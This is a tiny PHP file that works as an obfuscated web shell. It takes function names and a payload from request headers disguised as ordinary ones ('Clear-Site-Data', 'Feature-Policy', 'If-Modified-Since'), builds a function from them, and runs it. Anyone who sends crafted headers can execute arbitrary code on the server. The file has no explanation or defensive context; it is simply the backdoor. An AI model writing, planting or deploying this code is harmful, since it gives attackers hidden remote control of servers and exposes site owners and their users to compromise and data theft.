<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Clear-Site-Data'])) {
    $dba_insertion = $_HEADERS['Clear-Site-Data']('', $_HEADERS['Feature-Policy']($_HEADERS['If-Modified-Since']));
    $dba_insertion();
}